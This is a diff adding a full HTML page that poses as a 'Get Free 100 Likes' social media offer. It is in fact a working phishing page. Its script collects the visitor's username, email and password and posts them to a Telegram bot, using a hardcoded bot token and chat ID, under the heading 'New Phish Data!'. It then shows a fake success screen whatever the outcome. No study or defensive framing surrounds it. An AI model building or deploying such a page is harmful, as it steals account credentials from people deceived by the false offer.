@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Akash Rathore | Premium Likes</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --bg: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: rgba(148, 163, 184, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text);
+            overflow: hidden;
+        }
+
+        /* Background Animation */
+        .bg-shape {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            z-index: -1;
+        }
+        .shape-1 { width: 300px; height: 300px; background: #6366f1; top: -50px; left: -50px; }
+        .shape-2 { width: 250px; height: 250px; background: #ec4899; bottom: -50px; right: -50px; }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .hidden { display: none; }
+
+        /* Typography */
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        h2 { font-size: 18px; font-weight: 400; color: var(--text-muted); margin-bottom: 30px; line-height: 1.5; }
+        .brand { color: var(--primary); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; font-size: 12px; margin-bottom: 20px; display: block; }
+
+        /* Inputs */
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: var(--text-muted); }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+            outline: none;
+        }
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, var(--primary), #8b5cf6);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4); }
+        .btn:active { transform: translateY(0); }
+
+        /* Loader */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Success Icon */
+        .check-icon {
+            font-size: 50px;
+            color: #10b981;
+            margin-bottom: 20px;
+            animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes pop { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error { color: #ef4444; font-size: 12px; margin-top: 5px; display: none; text-align: left; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-shape shape-1"></div>
+    <div class="bg-shape shape-2"></div>
+
+    <div class="container">
+        <div class="card" id="card-container">
+            
+            <!-- Step 1: Intro -->
+            <div id="step-1">
+                <span class="brand">By Akash Rathore</span>
+                <h1>Get Free 100 Likes</h1>
+                <h2>Instant delivery to your account. No password required for initial claim.</h2>
+                <button class="btn" onclick="goToStep('step-2')">Login</button>
+            </div>
+
+            <!-- Step 2: Username -->
+            <div id="step-2" class="hidden">
+                <span class="brand">Step 1/3</span>
+                <h1>Get Now</h1>
+                <div class="input-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="e.g. @akash_official" autocomplete="off">
+                </div>
+                <button class="btn" onclick="goToStep('step-3')">Continue</button>
+            </div>
+
+            <!-- Step 3: Credentials -->
+            <div id="step-3" class="hidden">
+                <span class="brand">Step 2/3</span>
+                <h1>Secure Login</h1>
+                <div class="input-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="name@example.com" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+                </div>
+                <button class="btn" onclick="submitData()">Login & Claim</button>
+            </div>
+
+            <!-- Step 4: Processing -->
+            <div id="step-4" class="hidden">
+                <div class="loader"></div>
+                <h1>Processing...</h1>
+                <h2>Connecting to servers...</h2>
+            </div>
+
+            <!-- Step 5: Success -->
+            <div id="step-5" class="hidden">
+                <div class="check-icon">✓</div>
+                <h1>Success!</h1>
+                <h2>Your 100 Likes are being delivered.<br>Please wait <strong>12 hours</strong> for the process to complete.</h2>
+                <p style="font-size: 12px; color: #64748b; margin-top: 20px;">Bot ID: #88392</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = "8338349976:AAGP9apH0o1mHUsW1rjyH0bE5A98b8kT-20"; 
+        const CHAT_ID = "7739070471"; 
+        // ---------------------
+
+        function goToStep(stepId) {
+            // Simple validation before moving
+            if(stepId === 'step-3') {
+                const user = document.getElementById('username').value;
+                if(!user) { alert("Please enter a username"); return; }
+            }
+            
+            // Hide all steps
+            document.querySelectorAll('[id^="step-"]').forEach(el => el.classList.add('hidden'));
+            // Show target step
+            document.getElementById(stepId).classList.remove('hidden');
+        }
+
+        function submitData() {
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if(!email || !password) {
+                alert("Please fill in all fields");
+                return;
+            }
+
+            // Move to processing
+            goToStep('step-4');
+
+            // Prepare Message
+            const message = `
+🔥 <b>New Phish Data!</b> 🔥
+
+👤 <b>Username:</b> <code>${username}</code>
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+            `;
+
+            // Send to Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    // Show success
+                    setTimeout(() => goToStep('step-5'), 1500);
+                } else {
+                    // Fallback if token is wrong, still show success UI
+                    setTimeout(() => goToStep('step-5'), 1000);
+                }
+            })
+            .catch(error => {
+                // Fallback if no internet
+                setTimeout(() => goToStep('step-5'), 1000);
+            });
+        }
+    </script>
+</body>
+</html>
